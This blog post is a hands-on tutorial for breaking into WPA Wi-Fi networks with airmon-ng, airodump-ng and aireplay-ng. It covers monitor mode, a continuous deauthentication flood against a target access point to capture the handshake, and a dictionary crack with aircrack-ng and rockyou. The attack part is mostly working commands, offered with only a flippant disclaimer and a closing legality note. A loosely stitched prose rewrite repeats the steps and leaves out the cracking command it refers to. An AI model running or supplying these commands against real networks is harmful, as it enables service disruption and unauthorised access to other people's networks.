---
layout: layouts/post.njk
title: Wifi hacking with Airmon-ng
tags: 
    - hacking
    - linux
    - bash
    - blog
date: 2021-09-01
---

_Hack wifi routers, device broadbands and network stations. Don't hack other's devices._ 🌚

## Knowing basic info

1. Check the version of your OS

```bash
cat /etc/os-release
uname -a
```

2. See interfaces

```bash
ip addr
iwconfig
```

## Preparing

- kill processes

```bash
sudo airmon-ng check kill
```

- Start monitor mode

```bash
sudo airmon-ng start wlp2s0
```

- Verify that monitor mode is used

```bash
sudo airmon-ng
```

- You could also use iwconfig to check that interface is in monitor mode:

```bash
iwconfig
```

## Targeting

- Get the AP's MAC address and channel

```bash
sudo airodump-ng wlp2s0mon
```

- AP-MAC & channel - you need to select your own here:

```
ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP for SSID: 2
```

## Attack
You need to open two separate bash windows for this task.

1st Window
: Make sure you replace the channel number and bssid with your own
: Replace hack1 with your file name like capture1 or something 

```bash
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlp2s0mon
```

2nd Window - deauth attack
: Make sure you replace the bssid with your own

```bash
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlp2s0mon
```

Use Wireshark to open hack file

```bash
wireshark hack1-01.cap
```

Filter Wireshark messages for EAPOL by typing `eapol`.

## Stopping the attack

- Stop monitor mode

```bash
airmon-ng stop wlp2s0mon
```

- Get a crack file with Rock you or another wordlist
- Make sure you have rockyou in text format (unzip file on Kali)
- Replace hack1-01.cap with your file name

```bash
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```

---
👨‍💻
Discrete


---------------

Wireless networking has become an integral part of modern life, allowing us to connect to the internet from virtually anywhere. However, with the convenience of wireless comes the potential for security vulnerabilities. In this tutorial, we will walk through the steps of performing a simple wireless attack using Kali Linux, a popular distribution specifically designed for penetration testing and ethical hacking.

Before we begin, it's important to ensure that you have the necessary tools installed and your system is up to date. You can check the version of your operating system (OS) by using the command cat /etc/os-release. This will display the version and other information about your OS. You can also use the command uname -a to display information about your system's hardware and software environment.

Next, we need to identify the interfaces available on your system. You can do this using the command ip addr or iwconfig. These commands will display information about your network interfaces, including their names and configurations.

Before we can start the attack, we need to prepare our system. One important step is to kill any processes that may interfere with our wireless adapter. You can do this using the command sudo airmon-ng check kill. This will terminate any processes that may cause problems during the attack.

Once we have prepared our system, we can start the attack by putting our wireless adapter into monitor mode. Monitor mode allows the adapter to capture wireless packets without being associated with any particular network. To start monitor mode, use the command sudo airmon-ng start wlp2s0, replacing wlp2s0 with the name of your wireless adapter. You can verify that monitor mode is being used by running the command sudo airmon-ng, which will display a list of available interfaces and their modes. You can also use the command iwconfig to check that the interface is in monitor mode.

Now that we have our wireless adapter in monitor mode, we can begin targeting a specific wireless access point (AP). The first step is to get the AP's MAC address and channel. You can do this using the command sudo airodump-ng wlp2s0mon, which will display a list of available APs and their MAC addresses. Make note of the AP's MAC address and channel, as we will need them later.

With the AP's MAC address and channel in hand, we can now launch the attack. To do this, we will use two separate bash windows. In the first window, run the command sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlp2s0mon, replacing hack1 with a file name of your choosing, the channel number with the one for your target AP, and the BSSID (MAC address) with the one for your target AP. This command will capture wireless packets and save them to a file for later analysis.

In the second window, run the command sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlp2s0mon, replacing the BSSID with the one for your target AP. This command will send deauthentication packets to the AP, which will disrupt the connection between the AP and its clients.

Once the attack is complete, you can use Wireshark to open the captured packet file and analyze the packets. To do this, use the command wireshark hack1-01.cap, replacing hack1-01.cap with the name of your packet capture file.


The command will try to crack the password of the wireless network by running a dictionary attack, which involves trying to guess the password by trying every word in the wordlist. If the password is found in the wordlist, the command will output the password and exit. If the password is not found in the wordlist, the command will continue running until all words in the wordlist have been tried.

It is important to note that cracking the password of a wireless network is a violation of the network owner's security, and it is generally illegal to do so without permission. It is also important to use these tools responsibly and only on networks that you are authorized to test.